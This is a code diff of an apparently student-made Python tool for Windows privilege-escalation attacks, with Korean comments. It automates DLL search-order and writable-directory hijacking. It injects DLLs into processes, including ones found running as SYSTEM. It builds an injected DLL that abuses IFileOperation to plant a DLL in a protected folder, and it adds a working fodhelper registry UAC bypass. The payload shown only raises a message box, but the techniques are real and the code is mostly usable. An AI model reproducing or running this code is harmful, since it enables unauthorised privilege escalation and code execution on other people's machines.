@@ -1,4 +1,4 @@
-import os, signal
+import os
 from tqdm import tqdm
 from pyinjector import inject
 import subprocess
@@ -6,34 +6,25 @@ import psutil
 import shutil
 from pywinauto import *
 import time
+import ctypes
+import sys
+import winreg
+abspath = os.path.dirname(__file__)
 class hiJacking():
     def hiJacking(self):
         pass
     #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
     def list_dll(self,pid):
-        stream = os.popen("Listdlls.exe " + str(pid))
+
+        list_dll_path = os.getcwd() + "/" + "Listdlls.exe "
+        stream = os.popen(list_dll_path + str(pid))
+        
         dlls = stream.read()
         program_name = ""
         list_dlls = []
         list_programs = []
         path_lists = []
-        # try:
-        #     program_name = dlls.split("\n")[7]
-        #     program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
-        #     if not program_name.endswith('.exe'):
-        #         raise Exception("not exe File")
-        # except:
-        #     print("Wrong pid...")
-        
-        
-        # if 'C:/' not in program_name:
-        #     name_split = program_name.split('/')
-        #     name = name_split[-1]
-        #     for dirpath, dirname, filename in tqdm(os.walk("C:/")):
-        #         if name in filename:
-        #             program_name =  os.path.join(dirpath, name)
 
-        # split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
         try:
             split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
             
@@ -125,6 +116,7 @@ class hiJacking():
             print("Cannot remove or write DLL")
             print(e)
         return successed_list
+    
     def search_order_hijack(self,pid):
         program_name, list_dlls = self.list_dll(pid)
         program_path = os.path.dirname(program_name)
@@ -143,12 +135,6 @@ class hiJacking():
                 print(list_dlls[i] + "  1순위 복사 에러")
         newPid = self.create_process(program_name)
         program_name, newList_dlls = self.list_dll(newPid)
-        
-        # successed_path = {}
-        # for i in range(len(newList_dlls)):
-        #     if newList_dlls[i] in changed_path:
-        #         successed_path[list_dlls[i]] = newList_dlls[i]
-
 
         successed_path = {}
 
@@ -165,7 +151,6 @@ class hiJacking():
 
 
         psutil.Process(newPid).kill()
-        #psutil.Process(pid).kill()
         
             
         for i in changed_path:
@@ -178,7 +163,7 @@ class hiJacking():
         
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
-    def normal_hijack(self,pid):
+    def normal_hijack(self,path_dll,pid):
         successed_list = []
         program_name, list_dlls = self.list_dll(pid)
         file_list,dir_list = self.check_permission(list_dlls)
@@ -197,9 +182,150 @@ class hiJacking():
         else:
             print("Not Found writable dir")
         return successed_list
+    
+    
+    def abusing_IfileOperation(self,exe_path,dll_path="CreateDLL.dll"):
+        # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
+        if(os.system("cmake")):
+            os.system("cmake.msi")
+            print("Cmake 설치 후 다시 기능을 실행해 주세요")
+            return  
+        else:
+            os.system("cls")
+            #pass
+        successed_list = []
+        dll_abspath = ""
+        if(dll_path == "CreateDLL.dll"):
+            dll_abspath = os.path.dirname(__file__) + "\\" + dll_path
+        else:
+            dll_abspath = dll_path
+        
+        # # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
+        exe_pid = self.create_process(exe_path)
+        
+        program_name, list_dlls = self.list_dll(exe_pid)
+        
+        psutil.Process(exe_pid).kill()
+        dll_abspath = dll_abspath.replace("\\","\\\\")
+        # 원본을 전부 dll_tmp 로 복사하기
+        for i in list_dlls:
+            if i.endswith("CreateDLL.dll"):
+                
+                shutil.copy2(i,abspath+"\\"+"dll_tmp")
+                original_dll_path = os.path.dirname(i)
+                dll_name = i.split("/")[-1]
+                
+            # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
+                
+                original_dll_path = original_dll_path.replace("/","\\\\")
+                dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_abspath,original_dll_path,dll_name)
+                
+                with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
+                    refText = refFile.readlines()
+                    refFile.close()
+                with open("CreateIFileOperationDLL/dll.cpp",'w',encoding='utf-8') as dllFile:
+                    for i in refText:
+                        dllFile.write(i)
+                    dllFile.write(str(dll_code))
+                    dllFile.close()
+                
+                # dll 빌드 하기
+                os.system("cd "+ abspath + "/"+"CreateIFileOperationDLL && .\Build.bat")
+                time.sleep(1)
+                os.system("cls")
+                # notePad에 인젝션 하기
+                exploit_dll_path = abspath + "/"+"CreateIFileOperationDLL/Debug/exploitDll.dll"
+                
+                
+                #notePad_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe") 
+                
+                uac = uac_bypass()
+                #notePad_pid = uac.execute()
+                notePad_pid = self.create_process("C:/Windows/System32/notepad.exe")
+               
+                
+                try:
+
+                    inject(notePad_pid,exploit_dll_path)
+                    print("Attack Injection Success!")
+                except Exception as e:
+                    print("Attack Injection Fail...")
+                time.sleep(1)
+                app = Application(backend="win32").connect(process=notePad_pid)
+                try:
+                    dlg = app.window(title_re="오류")
+                    dlg.확인.click()
+                    pass
+                except:
+                    print("Injection Fail..")
+                else:
+                    # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
+                    
+                    psutil.Process(notePad_pid).kill()
+                    
+                    #다음을 위해 파일 정리하기   
+                    os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
+                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
+                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
+                    os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
+                
+                    
+                    
+                    hijacked_pid = self.create_process(exe_path)
+                    original_dll_path = original_dll_path.replace("\\\\","/").replace("\\","/")   
+                    dll_tmp_path = abspath + "/" + "dll_tmp"+"/"+dll_name
+                    # 7. 기본 악성 DLL을 사용시 messageBoxA가 띄워지므로 pywinauto를 이용하여 확인 버튼 클릭 정상 동작시 성공으로 간주
+                    # 4. 원본 dll을 복사 hijacking 종료 후 다시 원상 복귀
+                    os.system("cls")
+                    app = Application(backend="win32").connect(process=hijacked_pid)
+                    try:
+                        dlg = app.window(title_re="SECU")
+                        dlg.확인.click()
+                        print("Hijacking Success!")
+                        successed_list.append(original_dll_path + "/" + dll_name)
+                    except:
+                        print("Hijacking Fail..")
+                    
+                    psutil.Process(hijacked_pid).kill()
+                    # shutil.copy2(dll_tmp_path,original_dll_path)
+                    # os.remove(dll_tmp_path)
+                    original_dll_path = original_dll_path.replace("/","\\\\")
+                    dll_tmp_path = dll_tmp_path.replace("\\","/").replace("/","\\\\")
+                    dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_tmp_path,original_dll_path,dll_name)
+                    with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
+                        refText = refFile.readlines()
+                        refFile.close()
+                    with open("CreateIFileOperationDLL/dll.cpp",'w',encoding='utf-8') as dllFile:
+                        for i in refText:
+                            dllFile.write(i)
+                        dllFile.write(str(dll_code))
+                        dllFile.close()
+                
+
+                    os.system("cd " + abspath + "/"+ "CreateIFileOperationDLL && .\Build.bat")
+                    time.sleep(1)
+                    os.system("cls")
+                    uac = uac_bypass()
+                    #uac.execute()
+                    notePad_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe") 
+                    for proc in psutil.process_iter():
+                        if proc.name().endswith("notepad.exe"):
+                            notePad_pid = proc.pid
+                
+                    try:
+                        inject(notePad_pid,exploit_dll_path)
+                        print("Restore Injection Success!")
+                    except:
+                        print("Restore Injection Fail...")
+                    time.sleep(1)
+                    psutil.Process(notePad_pid).kill()
+                    os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
+                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
+                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
+                    os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
+                    
+        return successed_list
 class injection():
-    def injection(self):
-        pass
     #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
     def find_process(self):
         proc_lists = []
@@ -222,21 +348,98 @@ class injection():
         
      
     #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
-    def attack(self,pid,path_dll):
+    def attack(self,pid):
+        path_dll = abspath + "/" + "CreateDLL.dll"
         inject(pid,path_dll)
+        app = Application(backend="win32").connect(process=pid)
+        try:
+            dlg = app.window(title_re="SECU")
+            dlg.확인.click()
+                    
+        except:
+            print("Injection Fail..")
+        
+        else:
+            print("Injection Success!")
+            print("Target PID : " + pid)
+        
+        
 
+class uac_bypass():
 
+    def __init__(self):
+        self.CMD                   = r"C:\Windows\System32\notepad.exe"
+        self.REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
+        self.DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
+        self.FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
+    def is_running_as_admin(self):
+        '''
+        Checks if the script is running with administrative privileges.
+        Returns True if is running as admin, False otherwise.
+        '''    
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+        
+    def create_reg_key(self,key, value):
+        '''
+        Creates a reg key
+        '''
+        try:        
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, winreg.KEY_WRITE)                
+            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
+            winreg.CloseKey(registry_key)
+        except WindowsError:        
+            raise
+
+    def bypass_uac(self,cmd):
+        '''
+        Tries to bypass the UAC
+        '''
+        try:
+            self.create_reg_key(self.DELEGATE_EXEC_REG_KEY, '')
+            self.create_reg_key(None, cmd)    
+        except WindowsError:
+            raise
+
+    def execute(self):        
+        if not self.is_running_as_admin():
+            try:                
+                
+                self.bypass_uac(self.CMD)                
+                os.system(self.FOD_HELPER)
+                for proc in psutil.process_iter():
+                    if proc.name().endswith("notepad.exe"):
+                        notePad_pid = proc.pid                              
+            except WindowsError:
+                return
+        else:
+            pass
+    
+        return notePad_pid
 if __name__=='__main__': 
-    dll_inject = injection()
-    dll_hijact = hiJacking()
-    path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
-    path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-    pid = dll_hijact.create_process(path_exe)
-    #inject(pid,path_dll)
-    #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
-    # success = dll_hijact.search_order_hijack(20588)    
-    # for i,j in success.items():
-    #     print(i,j)
-    
-    lists = dll_hijact.normal_hijack(pid)
-    
+        dll_inject = injection()
+        dll_hijact = hiJacking()
+        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
+        # path_dll = "CreateIFileOperationDLL\Debug\PROJECT_NAME.dll"
+        # pid = dll_hijact.create_process(path_exe)
+        # inject(pid,path_dll)
+        #dll_hijact.abusing_IfileOperation(1234)
+        #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
+        # success = dll_hijact.search_order_hijack(20588)    
+        # for i,j in success.items():
+        #     print(i,j)
+        #os.system("cd CreateIFileOperationDLL && .\Build.bat")
+        # time.sleep(2)
+        # explore_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe")
+        
+        # inject(explore_pid,"CreateIFileOperationDLL/Debug/exploitDll.dll") 
+        # time.sleep(1)
+        # psutil.Process(explore_pid).kill()   
+        # os.remove("CreateIFileOperationDLL\CMakeCache.txt")
+        # shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
+        successed_list = dll_hijact.abusing_IfileOperation(path_exe)
+        for i in successed_list:
+            print(i)
